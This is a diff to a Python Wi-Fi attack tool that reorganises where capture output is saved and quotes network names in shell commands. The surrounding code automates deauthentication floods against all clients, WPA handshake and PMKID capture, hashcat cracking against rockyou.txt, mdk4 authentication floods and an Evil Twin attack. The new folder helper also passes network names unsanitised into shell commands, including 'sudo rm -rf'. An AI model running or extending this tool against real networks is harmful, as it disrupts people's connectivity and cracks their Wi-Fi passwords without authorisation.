@@ -262,7 +262,23 @@ def check_deps(interfaceName, attackMode):
     print(Fore.WHITE)
 
 
-""" Read file for ETwin Attack """
+
+""" Save the capture output in the corresponding directorys """
+def createDir(currentDir, accessPointName):
+    if os.path.exists(currentDir + '/wifiOutput/'):
+        if not os.path.exists(currentDir + '/wifiOutput/' + accessPointName):
+            os.system(f"""mkdir {currentDir}/wifiOutput/{accessPointName}""")
+        else:
+            os.system(f"""sudo rm -rf {currentDir}/wifiOutput/{accessPointName}/*""")
+    else:
+        os.system(f"""mkdir {currentDir}/wifiOutput""")
+        os.system(f"""mkdir {currentDir}/wifiOutput/{accessPointName}""")
+    
+    return currentDir + "/wifiOutput/" + accessPointName
+
+
+
+""" Read files for ETwin Attack """
 
 
 def read_file(attack_type):
@@ -362,12 +378,13 @@ def attack_func(network_interface, attack_mode):
         except subprocess.TimeoutExpired:
             process.kill()
         get_current_path = subprocess.check_output('pwd').strip()
-        set_path = f'{get_current_path.decode()}/Capture'
+        createPath = createDir(get_current_path.decode(), access_name.replace(" ", ""))
+        set_path = f'{createPath}/Capture'
         get_colours("\n[*] Waiting for the Handshake", 'cyan')
         os.system(
-            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface} &")
+            f"""xterm -hold -e sudo airodump-ng -c {access_channel} --essid '{access_name}' -w {set_path} {network_interface} &""")
         time.sleep(6)
-        os.system(f"xterm -hold -e aireplay-ng -0 30 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
+        os.system(f"""xterm -hold -e aireplay-ng -0 30 -e '{access_name}' -c FF:FF:FF:FF:FF:FF {network_interface} &""")
         time.sleep(2)
         subprocess.run(["clear"])
         script_banner()
@@ -408,10 +425,12 @@ def attack_func(network_interface, attack_mode):
         time.sleep(3)
         get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(150)} Seconds", 'blue')
         get_colours("", "yellow")
+        get_current_path = subprocess.check_output('pwd').strip()
+        saveOutput = createDir(get_current_path.decode(), "PKMID")
         process = subprocess.Popen(
-            ["sudo", "hcxdumptool", "-i" + network_interface, "--enable_status=1", "-o", "Capture_PKMID"])
+            ["sudo", "hcxdumptool", "-i" + network_interface, "--enable_status=1", "-o", f"{saveOutput}/Capture_PKMID"])
         try:
-            process.wait(timeout=150)  # Time for the process
+            process.wait(timeout=25)  # Time for the process
         except subprocess.TimeoutExpired:
             get_colours(f"\n[!] Timed out - killing process ID -  {Fore.BLUE + str(process.pid)}", 'red')
             process.kill()
@@ -422,16 +441,16 @@ def attack_func(network_interface, attack_mode):
         time.sleep(3)
         get_colours("", "yellow")
         subprocess.run(["clear"])
-        get_pkmid_hashes = subprocess.run(["sudo hcxpcaptool -z myHashes_PKMID Capture_PKMID"],
+        get_pkmid_hashes = subprocess.run([f"sudo hcxpcaptool -z wifiOutput/PKMID/myHashes_PKMID wifiOutput/PKMID/Capture_PKMID"],
                                           capture_output=True, text=True, shell=True)
         time.sleep(2)
         get_colours("\n[*] Trying getting hashes", "magenta")
         # subprocess.run(["rm", "Capture_PKMID"])
         time.sleep(2)
-        if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
+        if "PMKID(s) written to wifiOutput/PKMID/myHashes_PKMID" in get_pkmid_hashes.stdout:
             subprocess.run(["clear"])
             get_colours("[*] Starting with Brute-Force attack..".strip(), "blue".strip())
-            os.system(f"xterm -hold -e hashcat -m 22000 -a 0 -w 4 myHashes_PKMID /usr/share/wordlists/rockyou.txt "
+            os.system(f"xterm -hold -e hashcat -m 22000 -a 0 -w 4 {saveOutput}/myHashes_PKMID /usr/share/wordlists/rockyou.txt "
                       f"-d 1 --force &")
             os.system("clear")
             quit_program(network_interface)
@@ -457,9 +476,9 @@ def attack_func(network_interface, attack_mode):
         except subprocess.TimeoutExpired:
             process.kill()
         os.system(
-            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface} &")
+            f"""xterm -hold -e sudo airodump-ng -c {access_channel} --essid '{access_name}' {network_interface} &""")
         os.system(
-            f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 400} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
+            f"""xterm -hold -e aireplay-ng -0 {int(attack_time) * 400} -e '{access_name}' -c FF:FF:FF:FF:FF:FF {network_interface} &""")
         subprocess.run(["clear"])
         script_banner()
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
@@ -511,7 +530,7 @@ def attack_func(network_interface, attack_mode):
         get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
         get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
         os.system(
-            f"xterm -hold -e sudo mdk4 {network_interface} a -a {access_bssid}")
+            f"""xterm -hold -e sudo mdk4 {network_interface} a -a '{access_bssid}'""")
         quit_program(network_interface)
     # Evil Twin Attack
     elif attack_mode == "ETwin":
@@ -598,7 +617,7 @@ def attack_func(network_interface, attack_mode):
             except subprocess.TimeoutExpired:
                 process.kill()
             os.system(
-                f"xterm -hold -e aireplay-ng -0 4000000 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
+                f"""xterm -hold -e aireplay-ng -0 4000000 -e '{access_name}' -c FF:FF:FF:FF:FF:FF {network_interface} &""")
             subprocess.run(["clear"])
             script_banner()
             get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
